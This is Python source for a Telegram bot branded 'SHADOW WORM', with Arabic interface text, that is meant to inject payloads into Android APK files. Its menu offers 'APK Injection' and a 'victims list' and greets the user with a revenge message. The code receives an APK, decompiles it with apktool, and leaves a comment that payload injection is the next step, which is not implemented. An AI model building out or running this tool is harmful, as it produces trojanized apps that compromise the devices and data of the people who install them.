import os
import telebot
from telebot import types
from flask import Flask
import threading
import subprocess

# --- إعداد خادم الويب لإبقاء Render حياً ---
app = Flask('')
@app.route('/')
def home():
    return "SHADOW WORM SERVER IS ONLINE"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

# --- إعداد البوت ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🛠️ حقن تطبيق (APK Injection)", callback_data='create_apk')
    btn2 = types.InlineKeyboardButton("📱 قائمة الضحايا", callback_data='list_victims')
    markup.add(btn1, btn2)
    
    welcome_text = (
        "💀 **انت هنا للانتقام**\n"
        "--------------------------\n"
        "جاهز للعمليات. أرسل التطبيق المراد حقنه."
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'create_apk':
        msg = bot.edit_message_text("📥 ارسل لي ملف الـ APK الآن للبدء في عملية الحقن...", call.message.chat.id, call.message.message_id)
        bot.register_next_step_handler(msg, process_apk_step)

def process_apk_step(message):
    if message.content_type == 'document' and message.document.file_name.endswith('.apk'):
        try:
            bot.reply_to(message, "⏳ بدأت العملية... جاري تحميل الملف من خوادم تلجرام...")
            
            # تحميل الملف
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open("target.apk", 'wb') as f:
                f.write(downloaded_file)
            
            bot.reply_to(message, "⚙️ تم التحميل. جاري تفكيك التطبيق (Decompiling) الآن...")

            # تشغيل APKTool لتفكيك التطبيق
            # المسار bin/apktool هو ما أنشأناه في ملف install_tools.sh
            result = subprocess.run(['bash', 'bin/apktool', 'd', 'target.apk', '-f', '-o', 'decompiled_app'], capture_output=True, text=True)
            
            if result.returncode == 0:
                bot.send_message(message.chat.id, "✅ تم تفكيك التطبيق بنجاح. جاري حقن سكريبت Payload في ملفات المانيفست...")
                # هنا ستكون خطوة حقن الكود القادمة
            else:
                bot.send_message(message.chat.id, f"❌ فشل التفكيك: {result.stderr}")
                
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ تقني: {str(e)}")
    else:
        bot.reply_to(message, "⚠️ من فضلك أرسل ملف بصيغة APK فقط.")

# تشغيل السيرفر الوهمي والبوت
if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.infinity_polling()
